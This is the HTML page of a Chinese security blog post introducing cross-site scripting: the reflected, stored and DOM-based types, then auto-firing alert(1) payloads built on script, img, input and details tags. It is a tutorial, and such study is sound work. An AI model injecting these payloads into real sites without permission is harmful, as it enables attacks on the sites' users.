<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="XSS 简介XSS，全称Cross Site Scripting，即跨站脚本攻击，是最普遍的Web应用安全漏洞。这类漏洞能够使得攻击者嵌入恶意脚本代码到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。根据攻击代码的工作方式，XSS可以分为反射型的XSS">
<meta property="og:type" content="article">
<meta property="og:title" content="XSS 那些世人皆知的事">
<meta property="og:url" content="http://aeolustf.github.io/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/index.html">
<meta property="og:site_name" content="Ae0lu5">
<meta property="og:description" content="XSS 简介XSS，全称Cross Site Scripting，即跨站脚本攻击，是最普遍的Web应用安全漏洞。这类漏洞能够使得攻击者嵌入恶意脚本代码到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。根据攻击代码的工作方式，XSS可以分为反射型的XSS">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://aeolustf.github.io/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/0.png">
<meta property="og:image" content="http://aeolustf.github.io/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/1.png">
<meta property="og:image" content="http://aeolustf.github.io/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/2.png">
<meta property="og:image" content="http://aeolustf.github.io/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/3.png">
<meta property="og:image" content="http://aeolustf.github.io/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/4.png">
<meta property="og:image" content="http://aeolustf.github.io/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/5.png">
<meta property="og:image" content="http://aeolustf.github.io/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/6.png">
<meta property="og:image" content="http://aeolustf.github.io/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/7.png">
<meta property="og:image" content="http://aeolustf.github.io/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/8.png">
<meta property="og:image" content="http://aeolustf.github.io/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/9.png">
<meta property="og:image" content="http://aeolustf.github.io/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/10.png">
<meta property="article:published_time" content="2021-02-19T17:53:12.000Z">
<meta property="article:modified_time" content="2021-02-19T18:00:24.846Z">
<meta property="article:author" content="Ae0lu5">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://aeolustf.github.io/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/0.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>XSS 那些世人皆知的事</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 5.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a target="_blank" rel="noopener" href="http://github.com/AeolusTF">Projects</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2021/03/08/cobaltstrike%E9%82%AE%E7%AE%B1%E6%8F%90%E9%86%92/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2021/02/20/Pass-The-Ticket%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://aeolustf.github.io/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://aeolustf.github.io/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/&text=XSS 那些世人皆知的事"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://aeolustf.github.io/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/&title=XSS 那些世人皆知的事"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://aeolustf.github.io/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/&is_video=false&description=XSS 那些世人皆知的事"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=XSS 那些世人皆知的事&body=Check out this article: http://aeolustf.github.io/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://aeolustf.github.io/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/&title=XSS 那些世人皆知的事"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://aeolustf.github.io/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/&title=XSS 那些世人皆知的事"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://aeolustf.github.io/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/&title=XSS 那些世人皆知的事"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://aeolustf.github.io/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/&title=XSS 那些世人皆知的事"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://aeolustf.github.io/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/&name=XSS 那些世人皆知的事&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://aeolustf.github.io/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/&t=XSS 那些世人皆知的事"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">XSS 简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B"><span class="toc-number">1.1.</span> <span class="toc-text">反射型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8B"><span class="toc-number">1.2.</span> <span class="toc-text">存储型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOM%E5%9E%8B"><span class="toc-number">1.3.</span> <span class="toc-text">DOM型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E7%9A%84%E6%A0%87%E7%AD%BE%E4%B8%8E%E5%B1%9E%E6%80%A7"><span class="toc-number">1.4.</span> <span class="toc-text">一些常用的标签与属性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#scirpt-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.4.1.</span> <span class="toc-text">scirpt 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#img-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.4.2.</span> <span class="toc-text">img 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#input-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.4.3.</span> <span class="toc-text">input 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#details-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.4.4.</span> <span class="toc-text">details 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#svg-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.4.5.</span> <span class="toc-text">svg 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#select-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.4.6.</span> <span class="toc-text">select 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#iframe-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.4.7.</span> <span class="toc-text">iframe 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#video-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.4.8.</span> <span class="toc-text">video 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#audio-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.4.9.</span> <span class="toc-text">audio 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#body-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.4.10.</span> <span class="toc-text">body 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#textarea-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.4.11.</span> <span class="toc-text">textarea 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#keygen-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.4.12.</span> <span class="toc-text">keygen 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#marquee-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.4.13.</span> <span class="toc-text">marquee 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#isindex-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.4.14.</span> <span class="toc-text">isindex 标签</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-link-%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB-JavaScript-%E6%96%87%E4%BB%B6"><span class="toc-number">1.5.</span> <span class="toc-text">利用 link 远程包含 JavaScript 文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-JavaScript-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.6.</span> <span class="toc-text">利用 JavaScript 伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#a-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.6.1.</span> <span class="toc-text">a 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#iframe-%E6%A0%87%E7%AD%BE-1"><span class="toc-number">1.6.2.</span> <span class="toc-text">iframe 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#img-%E6%A0%87%E7%AD%BE-1"><span class="toc-number">1.6.3.</span> <span class="toc-text">img 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#form-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.6.4.</span> <span class="toc-text">form 标签</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF"><span class="toc-number">2.</span> <span class="toc-text">XSS 常见绕过姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4"><span class="toc-number">2.1.</span> <span class="toc-text">绕过空格过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%BC%95%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="toc-number">2.2.</span> <span class="toc-text">绕过引号过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%8B%AC%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="toc-number">2.3.</span> <span class="toc-text">绕过括号过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="toc-number">2.4.</span> <span class="toc-text">绕过关键字过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">2.4.1.</span> <span class="toc-text">大小写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">2.4.2.</span> <span class="toc-text">双写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87"><span class="toc-number">2.4.3.</span> <span class="toc-text">字符串拼接绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8eval-%E5%87%BD%E6%95%B0"><span class="toc-number">2.4.3.1.</span> <span class="toc-text">利用eval()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8top"><span class="toc-number">2.4.3.2.</span> <span class="toc-text">利用top</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-%E8%BE%93%E5%87%BA%E7%82%B9%E6%80%BB%E7%BB%93"><span class="toc-number">2.5.</span> <span class="toc-text">XSS 输出点总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA%E5%9C%A8%E5%B1%9E%E6%80%A7%E9%87%8C"><span class="toc-number">2.5.1.</span> <span class="toc-text">输出在属性里</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA%E5%9C%A8HTML%E6%A0%87%E7%AD%BE%E4%B9%8B%E9%97%B4"><span class="toc-number">2.5.2.</span> <span class="toc-text">输出在HTML标签之间</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA%E5%9C%A8script%E6%A0%87%E7%AD%BE%E4%B9%8B%E9%97%B4"><span class="toc-number">2.5.3.</span> <span class="toc-text">输出在script标签之间</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">XSS 字符编码绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E7%BD%91%E9%A1%B5%E8%A7%A3%E7%A0%81%E6%B5%81%E7%A8%8B"><span class="toc-number">3.1.</span> <span class="toc-text">请求网页解码流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTML-%E5%AE%9E%E4%BD%93%E7%BC%96%E7%A0%81"><span class="toc-number">3.2.</span> <span class="toc-text">HTML 实体编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URL%E7%BC%96%E7%A0%81"><span class="toc-number">3.3.</span> <span class="toc-text">URL编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Javascript-%E7%BC%96%E7%A0%81"><span class="toc-number">3.4.</span> <span class="toc-text">Javascript 编码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Unicode-%E7%BC%96%E7%A0%81"><span class="toc-number">3.4.1.</span> <span class="toc-text">Unicode 编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8DOM%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84JavaScript%E7%BC%96%E7%A0%81"><span class="toc-number">3.4.2.</span> <span class="toc-text">在DOM环境中的JavaScript编码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B7%B7%E5%90%88%E7%BC%96%E7%A0%81"><span class="toc-number">3.5.</span> <span class="toc-text">混合编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SVG%EF%BC%9AXSS%E7%9A%84%E4%B8%80%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95"><span class="toc-number">3.6.</span> <span class="toc-text">SVG：XSS的一个黑魔法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B%E6%80%9D%E8%B7%AF"><span class="toc-number">4.</span> <span class="toc-text">XSS 测试流程思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E6%B5%8B%E8%AF%95"><span class="toc-number">4.1.</span> <span class="toc-text">初步测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E5%85%B6%E4%BB%96%E6%A0%87%E7%AD%BE%E5%92%8C%E5%B1%9E%E6%80%A7"><span class="toc-number">4.2.</span> <span class="toc-text">测试其他标签和属性</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-%E6%94%BB%E5%87%BB%E9%9D%A2%E6%8B%93%E5%B1%95"><span class="toc-number">5.</span> <span class="toc-text">XSS 攻击面拓展</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-XSS-%E9%92%93%E9%B1%BC"><span class="toc-number">5.1.</span> <span class="toc-text">利用 XSS 钓鱼</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-XSS-%E7%9B%97%E5%8F%96-Cookie"><span class="toc-number">5.1.1.</span> <span class="toc-text">通过 XSS 盗取 Cookie</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-to-RCE"><span class="toc-number">5.2.</span> <span class="toc-text">XSS to RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-%E9%85%8D%E5%90%88-CSRF-%E7%9A%84%E5%89%8D%E7%AB%AF%E6%94%BB%E5%87%BB"><span class="toc-number">5.3.</span> <span class="toc-text">XSS 配合 CSRF 的前端攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-%E7%A0%B4%E5%9D%8F%E5%BC%8F%E6%94%BB%E5%87%BB"><span class="toc-number">5.4.</span> <span class="toc-text">XSS 破坏式攻击</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">6.</span> <span class="toc-text">参考资料</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        XSS 那些世人皆知的事
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Ae0lu5</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2021-02-19T17:53:12.000Z" itemprop="datePublished">2021-02-20</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="XSS-简介"><a href="#XSS-简介" class="headerlink" title="XSS 简介"></a><a href="#XSS-%E7%AE%80%E4%BB%8B" title="XSS 简介"></a>XSS 简介</h1><p>XSS，全称Cross Site Scripting，即跨站脚本攻击，是最普遍的Web应用安全漏洞。这类漏洞能够使得攻击者嵌入恶意脚本代码到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。根据攻击代码的工作方式，XSS可以分为反射型的XSS、存储型的XSS和DOM型的XSS。</p>
<h2 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a><a href="#%E5%8F%8D%E5%B0%84%E5%9E%8B" title="反射型"></a>反射型</h2><p>反射型的XSS是非持久化的，攻击者事先制作好攻击链接，需要欺骗用户自己去点击链接才能触发XSS代码，但是服务器中没有这样的页面和内容，一般容易出现在搜索页面。</p>
<h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a><a href="#%E5%AD%98%E5%82%A8%E5%9E%8B" title="存储型"></a>存储型</h2><p>存储型的XSS是持久化的，代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行。这种XSS非常危险，容易造成蠕虫，大量盗窃cookie。</p>
<h2 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a><a href="#DOM%E5%9E%8B" title="DOM型"></a>DOM型</h2><p>DOM型的XSS是基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。例如服务器端经常使用document.boby.innerHtml等函数动态生成html页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生DOM型的XSS。DOM型XSS可能是存储型，也有可能是反射型。</p>
<h2 id="一些常用的标签与属性"><a href="#一些常用的标签与属性" class="headerlink" title="一些常用的标签与属性"></a><a href="#%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E7%9A%84%E6%A0%87%E7%AD%BE%E4%B8%8E%E5%B1%9E%E6%80%A7" title="一些常用的标签与属性"></a>一些常用的标签与属性</h2><p>下面我列举的标签大部分是可以自动触发js代码的，无需用户去交互，大部分情况下我们也是希望是自动触发而不是等用户去触发。</p>
<h3 id="scirpt-标签"><a href="#scirpt-标签" class="headerlink" title="scirpt 标签"></a><a href="#scirpt-%E6%A0%87%E7%AD%BE" title="scirpt 标签"></a>scirpt 标签</h3><p><code>&lt;script&gt;</code> 标签用于定义客户端脚本，比如 JavaScript。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;script\&gt;alert(1);&lt;&#x2F;script\&gt;  </span><br><span class="line">2  &lt;script\&gt;alert(&quot;xss&quot;);&lt;&#x2F;script\&gt;  </span><br></pre></td></tr></table></figure>
<h3 id="img-标签"><a href="#img-标签" class="headerlink" title="img 标签"></a><a href="#img-%E6%A0%87%E7%AD%BE" title="img 标签"></a>img 标签</h3><p><code>&lt;img&gt;</code> 标签定义 HTML 页面中的图像。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;img src\&#x3D;1 onerror\&#x3D;alert(1);\&gt;  </span><br><span class="line">2  &lt;img src\&#x3D;1 onerror\&#x3D;alert(&quot;xss&quot;);&gt;  </span><br></pre></td></tr></table></figure>
<h3 id="input-标签"><a href="#input-标签" class="headerlink" title="input 标签"></a><a href="#input-%E6%A0%87%E7%AD%BE" title="input 标签"></a>input 标签</h3><p><code>&lt;input&gt;</code> 标签规定了用户可以在其中输入数据的输入字段。</p>
<p>onfocus 事件在对象获得焦点时发生：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;input onfocus\&#x3D;alert(1);\&gt;  </span><br></pre></td></tr></table></figure>
<p>竞争焦点，从而触发onblur事件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;input onblur\&#x3D;alert(1) autofocus\&gt;&lt;input autofocus\&gt;   </span><br></pre></td></tr></table></figure>

<p>input 标签的 autofocus 属性规定当页面加载时 <code>&lt;input&gt;</code> 元素应该自动获得焦点。可以通过autofocus属性自动执行本身的focus事件，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;input onfocus\&#x3D;&quot;alert(1);&quot; autofocus\&gt;  </span><br></pre></td></tr></table></figure>

<h3 id="details-标签"><a href="#details-标签" class="headerlink" title="details 标签"></a><a href="#details-%E6%A0%87%E7%AD%BE" title="details 标签"></a>details 标签</h3><p><code>&lt;details&gt;</code> 标签通过提供用户开启关闭的交互式控件，规定了用户可见的或者隐藏的需求的补充细节。ontoggle 事件规定了在用户打开或关闭 <code>&lt;details&gt;</code> 元素时触发：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;details ontoggle\&#x3D;alert(1);\&gt;  </span><br></pre></td></tr></table></figure>

<p>使用details 标签的 open 属性触发ontoggle事件，无需用户去点击即可触发：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;details open ontoggle\&#x3D;alert(1);\&gt;  </span><br></pre></td></tr></table></figure>

